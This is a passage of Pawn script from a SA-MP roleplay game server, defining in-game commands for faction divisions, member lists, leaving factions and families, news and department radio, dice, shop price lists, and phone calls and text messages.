	if(Player[user][pFacDiv] != Player[playerid][pFacDiv]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in in your division.");
	Player[user][pFacDiv] = 0;
	Player[user][pFacDivLeader] = 0;
	format(string, sizeof(string), "You have removed %s from the {01A9DB}%s {33CCFF}division.", GetName(user), RPFDN(user));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), "%s has removed you from to the {01A9DB}%s {33CCFF}division.", GetName(playerid), RPFDN(user));
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:setdivision(playerid, var[])
{
	new user, division, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(IsACop(playerid))
	{
    	if(sscanf(var, "ui", user, division))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: setdivision [playerid] [division]");
    		format(string, sizeof(string), "** [DIVISIONS]: 1) %s | 2) %s | 3) %s | 4) %s | 5) %s", FacInfo[1][fDiv1], FacInfo[1][fDiv2], FacInfo[1][fDiv3], FacInfo[1][fDiv4]);
    		SendClientMessage(playerid, COLOR_GRAD2, string);
    		return 1;
    	}
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
    	if(division < 0 || division > 5) return SendClientMessage(playerid, COLOR_GRAD2, "Divisions are between 1 and 4.");
    	if(Player[user][pFacDiv] == division) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in a division.");
        Player[user][pFacDiv] = division;
        Player[user][pFacDivLeader] = division;
    	format(string, sizeof(string), "You have assigned %s to lead the {01A9DB}%s {33CCFF}division.", GetName(user), RPFDN(user));
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    	format(string, sizeof(string), "%s has assigned you to lead the {01A9DB}%s {33CCFF}division.", GetName(playerid), RPFDN(user));
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    }
    if(IsFBI(playerid))
	{
    	if(sscanf(var, "ui", user, division))
    	{
    		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: setdivision [playerid] [division]");
    		format(string, sizeof(string), "** [DIVISIONS]: 1) %s | 2) %s | 3) %s | 4) %s | 5) %s | 6) %s", FacInfo[6][fDiv1], FacInfo[6][fDiv2], FacInfo[6][fDiv3], FacInfo[6][fDiv4], FacInfo[6][fDiv5], FacInfo[6][fDiv6]);
    		SendClientMessage(playerid, COLOR_GRAD2, string);
    		return 1;
    	}
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
    	if(division < 0 || division > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Divisions are between 1 and 6.");
    	if(Player[user][pFacDiv] == division) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in a division.");
        Player[user][pFacDiv] = division;
        Player[user][pFacDivLeader] = division;
    	format(string, sizeof(string), "You have assigned %s to lead the {01A9DB}%s {33CCFF}division.", GetName(user), RPFDN(user));
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    	format(string, sizeof(string), "%s has assigned you to lead the {01A9DB}%s {33CCFF}division.", GetName(playerid), RPFDN(user));
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    }
	return 1;
}




IRP:members(playerid, var[])
{
	new string[128], online;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFac])
	{
		foreach(Player, i)
		{
		    if(Player[i][pFac] == Player[playerid][pFac])
		    {
		        online ++;
		    }
		}
		format(string, sizeof(string), "|________ Faction Members ________|");
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		foreach(Player, i)
		{
		    if(Player[i][pFac] == Player[playerid][pFac])
		    {
		        if(Player[i][pFacLeader])
		        {
		            if(Player[playerid][pFacLeader] && Player[i][pFacDiv]) format(string, sizeof(string), "- [Leader] [%s] [%s (%d)] %s", RPFDN(i), RPFRN(i), Player[i][pFacRank], GetName(i));
		            else format(string, sizeof(string), "- [Leader] [%s (%d)] %s", RPFRN(i), Player[i][pFacRank], GetName(i));
		            if(Player[playerid][pFac] == 3) format(string, sizeof(string), "- [Leader] [%s (%d)] %s (Success: %d | Fail: %d)", RPFRN(i), Player[i][pFacRank], GetName(i), Player[i][pCSuccess], Player[i][pCFail]);
		        }
		        else
		        {
		            if(Player[playerid][pFacLeader] && Player[i][pFacDiv]) format(string, sizeof(string), "- [%s] [%s (%d)] %s", RPFDN(i), RPFRN(i), Player[i][pFacRank], GetName(i));
		            else format(string, sizeof(string), "- [%s (%d)] %s", RPFRN(i), Player[i][pFacRank], GetName(i));
  					if(Player[playerid][pFac] == 3) format(string, sizeof(string), "- [%s (%d)] %s (Success: %d | Fail: %d)", RPFRN(i), Player[i][pFacRank], GetName(i), Player[i][pCSuccess], Player[i][pCFail]);

				}
		        SendClientMessage(playerid, COLOR_WHITE, string);
		    }
		}
	}
	if(Player[playerid][pFam])
	{
	    online = 0;
		foreach(Player, i)
		{
		    if(Player[i][pFam] == Player[playerid][pFam])
		    {
		        online ++;
		    }
		}
		format(string, sizeof(string), "|_______ Family Members ________|");
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		foreach(Player, i)
		{
		    if(Player[i][pFam] == Player[playerid][pFam])
		    {
	            format(string, sizeof(string), "- [%s (%d)] %s", RPFaRN(i), Player[i][pFamRank], GetName(i));
		        SendClientMessage(playerid, COLOR_WHITE, string);
		    }
		}
	}
	return 1;
}

IRP:quitfaction(playerid, var[])
{
	new string[128], faction[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a faction.");
	if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /quitfaction [confirm]");
	if(!strcmp(var, "confirm", true))
	{
		// Detecting Faction//
		if(Player[playerid][pFac] == 1)
		{
	    	format(faction, sizeof(faction), "Los Santos Police Department");
	    	FacInfo[1][facMembers] --;
	    }
		else if(Player[playerid][pFac] == 2)
		{
	    	format(faction, sizeof(faction), "Government");
	    	FacInfo[2][facMembers] --;
	    }
	   	else if(Player[playerid][pFac] == 3)
	   	{
		   format(faction, sizeof(faction), "Hitman Agency");
		   FacInfo[3][facMembers] --;
		}
		else if(Player[playerid][pFac] == 4)
		{
		   format(faction, sizeof(faction), "San Andreas News");
		   FacInfo[4][facMembers] --;
		}
		else if(Player[playerid][pFac] == 5)
		{
	    	format(faction, sizeof(faction), "Los Santos Fire & Medical Department");
	    	FacInfo[5][facMembers] --;
	    }
		else if(Player[playerid][pFac] == 6)
		{
	    	format(faction, sizeof(faction), "Federal Bureau Of Investigation");
	    	FacInfo[6][facMembers] --;
	    }
		else if(Player[playerid][pFac] == 7)
		{
	    	format(faction, sizeof(faction), "Department Of Correction");
	    	FacInfo[7][facMembers] --;
	    }
		// Quitting Faction
		Player[playerid][pFac] = 0;
		Player[playerid][pFacRank] = 0;
		Player[playerid][pFacLeader] = 0;
		format(string, sizeof(string), " You have quit the {01A9DB}%s {33CCFF}faction, you are now a civilian.", faction);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	return 1;
}

IRP:quitfamily(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a  family.");
	if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /quitfamily [confirm]");
	if(!strcmp(var, "confirm", true))
	{
	    new idx = Player[playerid][pFam];
		format(string, sizeof(string), " You have quit the {01A9DB}%s {33CCFF}family.", FamInfo[idx][fName]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		FamInfo[idx][fMembers] --;
		Player[playerid][pFam] = 0;
		Player[playerid][pFamRank] = 0;
		new name[MAX_PLAYER_NAME];
        GetPlayerName(playerid, name, sizeof(name));
    	if(!strcmp(name, "FamInfo[idx][fLeader]", false))
		{
            foreach(Player, i)
    		{
	     	    if(Logged(i))
	    	    {
                    if(FamInfo[idx][fColor] == 2)
	    			{
                	    format(string, sizeof(string), "FamCmd: {0000FF}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
            	    else if(FamInfo[idx][fColor] == 1)
	            	{
                 	    format(string, sizeof(string), "FamCmd: {00FFFF}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
           	        }
            		else if(FamInfo[idx][fColor] == 3)
	               	{
                	    format(string, sizeof(string), "FamCmd: {FF0000}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 4)
	               	{
                	    format(string, sizeof(string), "FamCmd: {B40404}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 5)
	               	{
                	    format(string, sizeof(string), "FamCmd: {FFFF00}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 6)
	               	{
                	    format(string, sizeof(string), "FamCmd: {DF7401}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 7)
	               	{
                	    format(string, sizeof(string), "FamCmd: {088A08}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 8)
	               	{
                	    format(string, sizeof(string), "FamCmd: {CC2EFA}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 9)
	               	{
                	    format(string, sizeof(string), "FamCmd: {00FF00}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 10)
	               	{
                	    format(string, sizeof(string), "FamCmd: {A4A4A4}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else if(FamInfo[idx][fColor] == 11)
	               	{
                	    format(string, sizeof(string), "FamCmd: {000000}%s {FF6347}has been disbanded due to leader quitting.", FamInfo[idx][fName]);
	    	    		SendClientMessage(i, COLOR_LIGHTRED, string);
                	}
                	else
                	{
                        format(string, sizeof(string), "FamCmd: %s has been disbanded due to leader quitting.", FamInfo[idx][fName]);
   	             	    SendClientMessage(i, COLOR_LIGHTRED, string);
			        }
	    	        if(Player[i][pFam] == idx)
		            {
	    	            Player[i][pFam] = 0;
		                Player[i][pFamRank] = 0;
	    		        format(string, sizeof(string), "FamCmd: Your family has been disbanded, you have been autokicked from the family.");
	    				SendClientMessage(i, COLOR_LIGHTBLUE, string);
	    	        }
	    	    }
    		}
	    	Player[playerid][pFam] = 0;
	    	Player[playerid][pFamRank] = 0;
	    	FamInfo[idx][fLevel] = 1;
	    	FamInfo[idx][fTaken] = 0;
	    	format(FamInfo[idx][fName], 32, "None");
	    	format(FamInfo[idx][fMOTD], 64, "");
	    	FamInfo[idx][fColor] = 0;
	    	format(FamInfo[idx][fLeader], MAX_PLAYER_NAME, "None");
    		FamInfo[idx][fMembers] = 0;
    		FamInfo[idx][fCookies] = 0;
    		FamInfo[idx][fPissAchievment] = 0;
    		FamInfo[idx][fHQAchievment] = 0;
    		FamInfo[idx][fSafeAchievment] = 0;
    		FamInfo[idx][fPointAchievment] = 0;
    		FamInfo[idx][fSafeX] = 0;
    		FamInfo[idx][fSafeY] = 0;
    		FamInfo[idx][fSafeZ] = 0;
    		FamInfo[idx][fStrikes] = 0;
    		FamInfo[idx][fHQX] = 0;
    		FamInfo[idx][fHQY] = 0;
    		FamInfo[idx][fHQZ] = 0;
	    	FamInfo[idx][fMoney] = 0;
    		FamInfo[idx][fMats] = 0;
    		FamInfo[idx][fWeed] = 0;
    		FamInfo[idx][fSeeds] = 0;
	    	FamInfo[idx][fcocaine] = 0;
    		format(FamInfo[idx][fRank1], 32, "");
	    	format(FamInfo[idx][fRank2], 32, "");
	     	format(FamInfo[idx][fRank3], 32, "");
	    	format(FamInfo[idx][fRank4], 32, "");
	    	format(FamInfo[idx][fRank5], 32, "");
     		format(FamInfo[idx][fRank6], 32, "");
    		FamInfo[idx][fSkins][0] = 0;
    		FamInfo[idx][fSkins][1] = 0;
     		FamInfo[idx][fSkins][2] = 0;
    		FamInfo[idx][fSkins][3] = 0;
    		FamInfo[idx][fSkins][4] = 0;
	    	FamInfo[idx][fSkins][5] = 0;
	    	FamInfo[idx][fSkins][6] = 0;
    		DestroyDynamicPickup(FamInfo[idx][fPickup]);
    		DestroyDynamic3DTextLabel(FamInfo[idx][fText]);
    		DestroyDynamicPickup(FamInfo[idx][fHQPickup]);
    		DestroyDynamic3DTextLabel(FamInfo[idx][fHQText]);
    		for(new veh=0; veh<5; veh++)
	    	{
    			if(FamInfo[idx][fVehType][veh])
    			{
	    		    FamInfo[idx][fVehType][veh] = 0;
	    		    FamInfo[idx][fVehCoX][veh] = 0;
		    		FamInfo[idx][fVehCoY][veh] = 0;
	    			FamInfo[idx][fVehCoZ][veh] = 0;
		    		FamInfo[idx][fVehRot][veh] = 0;
		    		FamInfo[idx][fVehCol1][veh] = 0;
		    		FamInfo[idx][fVehCol2][veh] = 0;
		    		DestroyVehicle(FamInfo[idx][fVeh][veh]);
		    	}
    		}
    	}
	}
	return 1;
}

IRP:news(playerid, var[])
{
	new string[128];
	if(!IsAReporter(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a news reporter.");
	if(!IsNewsVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a news vehicle.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /news [text]");
	if(AntiAdv(playerid, var)) return 1;
	format(string, sizeof(string), "** [News] %s: %s", GetName(playerid), var);
	SendClientMessageToAll(COLOR_ORANGE, string);
	Log("Log/Players/news.log", string);
	return 1;
}

IRP:live(playerid, var[])
{
	new string[128], user;
	if(!IsAReporter(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a news reporter.");
	if(!IsNewsVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a news vehicle.");
	if(Live[playerid])
	{
	    foreach(Player, i)
	    {
	        if(Live[i] && i != playerid) user = i;
	    }
	    Live[playerid] = 0;
	    Live[user] = 0;
	    LiveConference = 0;
	    SendClientMessage(playerid, COLOR_LIGHTRED, "You have ended the live news conference.");
	    SendClientMessage(user, COLOR_LIGHTRED, "The live news conference has ended.");
	}
	else
	{
	    if(LiveRequest[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You have already offered someone a live news conference.");
	    if(LiveConference) return SendClientMessage(playerid, COLOR_GRAD2, "Another live news conference is already being held.");
		if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /live [playerid]");
		if(user == playerid) return SendClientMessage(playerid, COLOR_GRAD2, "You can't offer yourself to a live news conference.");
		if(LiveBy[user] != -1) return SendClientMessage(playerid, COLOR_GRAD2, "Player has been already offered a live news conference.");
		LiveBy[user] = playerid;
		LiveRequest[playerid] = 1;
		format(string, sizeof(string), " You have offered %s a live news conference.", GetName(user));
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), " News Reporter %s has offered you a live news conference. (/accept live) (/cancel live)", GetName(playerid));
		SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	return 1;
}

IRP:r(playerid, var[])
{
	new string[256], string1[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsACop(playerid) && !IsAGov(playerid) && !IsMedic(playerid) && !IsFBI(playerid) && !IsDOC(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LSPD Officer/FBI agent/Government Official/Medic.");
	if(sscanf(var, "s[256]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/r)adio [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(IsACop(playerid))
	{
    	format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
    	SendCopMessage(COLOR_BLUE, string);
    	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
    	SetPlayerChatBubble(playerid,string1,COLOR_WHITE,20.0,5000);
    }
    else if(IsAGov(playerid))
	{
    	format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
    	SendGovMessage(COLOR_GOV, string);
    	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
    	SetPlayerChatBubble(playerid,string1,COLOR_WHITE,20.0,5000);
    }
    else if(IsMedic(playerid))
	{
    	format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
    	SendMedicMessage(COLOR_MEDIC, string);
    	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
    	SetPlayerChatBubble(playerid,string1,COLOR_WHITE,20.0,5000);
    }
    else if(IsFBI(playerid))
	{
    	format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
    	SendFBIMessage(COLOR_FBI, string);
    	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
    	SetPlayerChatBubble(playerid,string1,COLOR_WHITE,20.0,5000);
    }
    else if(IsDOC(playerid))
	{
    	format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
    	SendNGMessage(COLOR_DOC, string);
    	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
    	SetPlayerChatBubble(playerid,string1,COLOR_WHITE,20.0,5000);
    }
	if(IsACop(playerid)) Log("Log/Players/LSPD.log", string);
	else if(IsAGov(playerid)) Log ("Log/Players/GOV.log", string);
	else if(IsDOC(playerid)) Log ("Log/Players/NG.log", string);
	else if(IsFBI(playerid)) Log ("Log/Players/FBI.log", string);
	else if(IsMedic(playerid)) Log ("Log/Players/LSFMD.log", string);
	return 1;
}
IRP:san(playerid, var[])
{
	new string[128], string1[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!IsAReporter(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a news reporter.");
	if(sscanf(var, "s[256]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /san [text]");
	if(AntiAdv(playerid, var)) return 1;
    format(string, sizeof(string), "** %s %s: %s", RPFRN(playerid), GetName(playerid), var);
	SendNAMessage(COLOR_NEWS, string);
	format(string1, sizeof(string1), "** [Radio] %s: %s **", GetName(playerid), var);
	SetPlayerChatBubble(playerid,var,COLOR_WHITE,20.0,5000);
	Log("Log/Players/NA.log", string);
	return 1;
}
IRP:d(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(!IsACop(playerid) && !IsAGov(playerid) && !IsDOC(playerid) && !IsFBI(playerid) && !IsMedic(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not an LEO/LSFMD/Government Official.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/d)epartments radio [text]");
	if(AntiAdv(playerid, var)) return 1;
	// Raido Message
	format(string, sizeof(string), "** [Radio] %s: %s", GetName(playerid), var);
	SetPlayerChatBubble(playerid,var,COLOR_WHITE,20.0,5000);
	format(string, sizeof(string), "** [%s] %s %s: %s", RPFN(playerid),  RPFRN(playerid), GetName(playerid), var);
	foreach(Player, i)
	{
	    if(IsACop(i) || IsAGov(i) || IsFBI(i) || IsDOC(i) || IsMedic(i))
	    {
			SendClientMessage(i, COLOR_DEPTRADIO, string);
	    }
	}
	Log("Log/Players/departments.log", string);
	return 1;
}

IRP:dice(playerid, var[])
{
	new string[128], val1, val2;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pDice]) return SendClientMessage(playerid, COLOR_GRAD2, "You have no dice on you.");
	val1 = 1+random(6);
	val2 = 1+random(6);
    format(string, sizeof(string), "* %s rolls a pair of dice on the floor, the first dice shows %d while the other shows %d.", GetName(playerid), val1, val2);
	SendNearbyMessage(playerid, 4, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:prices(playerid, var[])
{
	new idx = GetPlayerVirtualWorld(playerid)-100, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 && BizInfo[idx][bType] != 2 && BizInfo[idx][bType] != 3 && BizInfo[idx][bType] != 4 && BizInfo[idx][bType] != 6 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside a business.");
	if(BizInfo[idx][bType] == 1)
	{
	    format(string, sizeof(string), "** %s's Market menu list **", BizInfo[idx][bOwner]);
	    SendClientMessage(playerid, COLOR_INT, string);
		SendClientMessage(playerid, COLOR_WHITE, "Cellphone ($1500) | Phonebook ($500) | Dice ($800) | Cigar ($250)");
		SendClientMessage(playerid, COLOR_WHITE, "Sprunk ($500) | Spraycan ($550) | Rope ($800) | Mask ($30000)");
	    SendClientMessage(playerid, COLOR_WHITE, "Blindfold ($800) | WalkieTalkie ($2500) | MP3 ($10000)");
		SendClientMessage(playerid, COLOR_WHITE, "Camera ($2500) | GasCan ($3000) | Boombox ($20000) | Speedo ($6000)");
	}
	else if(BizInfo[idx][bType] == 3)
	{
	    format(string, sizeof(string), "** %s's Ammunation menu list **", BizInfo[idx][bOwner]);
	    SendClientMessage(playerid, COLOR_INT, string);
		SendClientMessage(playerid, COLOR_WHITE, "1) Shotgun Ammo ($3000) | 2) Rifle Ammo ($3200) | 3) Gun Ammo ($3600)");
		SendClientMessage(playerid, COLOR_WHITE, "4) Light-Machinegun Ammo ($4000) | 5) Heavy-Machinegun Ammo ($5000)");
	}
	else if(BizInfo[idx][bType] == 4)
	{
	    format(string, sizeof(string), "** %s's Club menu list **", BizInfo[idx][bOwner]);
	    SendClientMessage(playerid, COLOR_INT, string);
		SendClientMessage(playerid, COLOR_WHITE, "1) Sprunk ($500) | 2) Beer ($800) | 3) Vodka ($1000)");
	}
	else if(BizInfo[idx][bType] == 6)
	{
	    format(string, sizeof(string), "** %s's Fast Food menu list **", BizInfo[idx][bOwner]);
	    SendClientMessage(playerid, COLOR_INT, string);
		SendClientMessage(playerid, COLOR_WHITE, "1) Small Meal ($800) | 2) Medium Meal ($1300) | 3) Big Meal ($2000)");
	}
	return 1;
}


IRP:call(playerid, var[])
{
	new string[256], phonenumb;

	if(isnull(var))
		return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /call [phonenumber]");
	phonenumb = strval(var);
    if(Player[playerid][pHasCellphone] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have a cellphone, Get one from any Market.");
		return 1;
	}
	if(Player[playerid][pPhone] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have a simcard, Get one from the telephone company. ( Cityhall )");
		return 1;
	}
	if(PhoneOff[playerid])
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Your phone is off, Turn it on to call somebody.");
		return 1;
	}
	format(string, sizeof(string), "* %s takes out a cellphone from his pocket.", GetName(playerid));
	SendNearbyMessage(playerid, 30.0, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	if(phonenumb == 911)
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [HINT]: You now use T to talk on your cellphone, type /hangup to hang up.");
		SendClientMessage(playerid, COLOR_DEPTRADIO, "** [EMERGENCY]: Which service do you require, police or paramedic?");
		Mobile[playerid] = 911;
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
		SetPlayerAttachedObject(playerid, 9, 18873, 6);
		return 1;
	}
	if(phonenumb == Player[playerid][pPhone])
	{
		SendClientMessage(playerid, COLOR_WHITE, "* You can hear a busy tone. *");
		return 1;
	}
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_WHITE, "* You're already on a call.");
		return 1;
	}
	foreach(Player, i)
	{
		if(Player[i][pPhone] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(Logged(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					if(PhoneOff[giveplayerid])
					{
						SendClientMessage(playerid, COLOR_GRAD2, "That player's phone is switched off.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] != INVALID_PLAYER_ID)
					{
						SendClientMessage(playerid, COLOR_WHITE, "* You can hear a busy tone. *");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Spec[giveplayerid]!=0)
					{
						SendClientMessage(playerid, COLOR_WHITE, "* You can hear a busy tone. *");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] == INVALID_PLAYER_ID)
					{
						format(string, sizeof(string), "Your mobile is ringing - type /pickup to answer it.");
						SendClientMessage(giveplayerid, COLOR_YELLOW, string);
						format(string, sizeof(string), "* %s's phone begins to ring.", GetName(i));
						SendClientMessage(playerid, COLOR_WHITE, "** [HINT]: You now use T to talk on your cellphone, type /hangup to hang up.");
						SendNearbyMessage(playerid, 30.0, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						CellTime[playerid] = 1;
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
						SetPlayerAttachedObject(playerid, 9, 18873, 6);
						return 1;
					}
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_WHITE, "Your call can't be completed as dialed, please check the number and try again.");
	return 1;
}

IRP:hangup(playerid,var[])
{
	new caller = Mobile[playerid];
	if((Logged(caller) && caller != INVALID_PLAYER_ID)|| caller == 911 || caller == 912 || caller == 913 || caller == 914)
	{
		if(caller < 500)
		{
			SendClientMessage(caller,  COLOR_WHITE, "The person you were calling hung up the line.");
			CellTime[caller] = 0;
			Mobile[caller] = INVALID_PLAYER_ID;
		}
		CellTime[playerid] = 0;
		SendClientMessage(playerid,  COLOR_WHITE, "You hung up the line with the person you were calling.");
		Mobile[playerid] = INVALID_PLAYER_ID;
		CellTime[playerid] = 0;
		SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
        RemovePlayerAttachedObject(caller, 9);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
		RemovePlayerAttachedObject(playerid, 9);
		return 1;
	}
	SendClientMessage(playerid,  COLOR_GRAD2, "Your phone is in your pocket.");
	return 1;
}
IRP:pickup(playerid, var[])
{
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_WHITE, "");
		return 1;
	}
	foreach(Player, i)
	{
		if(Mobile[i] == playerid)
		{
			Mobile[playerid] = i; //caller connecting
			SendClientMessage(i,  COLOR_LIGHTSALMON, "The person you are calling have picked up the line.");
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid, 9, 18873, 6);
		}
	}
	return 1;
}
IRP:sms(playerid, var[])
{
	new string[256], phonenumb, text[100];
	if(sscanf(var, "ds[100]", phonenumb, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sms [phonenumber] [text chat]");
    if(Player[playerid][pHasCellphone] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have a cellphone, Get one from any Market.");
		return 1;
	}
	if(Player[playerid][pPhone] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You don't have a simcard, Get one from the telephone company. (Cityhall)");
		return 1;
	}
	if(PhoneOff[playerid])
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Your phone is off, Turn it on to sms somebody.");
		return 1;
	}
	if(phonenumb == 911)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "The number you have dialed has not been recognized.");
		return 1;
	}
	foreach(Player, i)
	{
		if(Player[i][pPhone] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid)) {
				if(giveplayerid != INVALID_PLAYER_ID) {
					if(PhoneOff[giveplayerid]) {
						SendClientMessage(playerid, COLOR_GRAD2, "That player's phone is switched off.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}

					format(string, sizeof(string), "SMS: %s, Ph: %d", text, Player[playerid][pPhone]);
					LastSMS[playerid] = Player[giveplayerid][pPhone];
					LastSMS[giveplayerid] = Player[playerid][pPhone];
					SendClientMessage(giveplayerid, COLOR_YELLOW, string);
					SendClientMessage(playerid, COLOR_YELLOW, string);
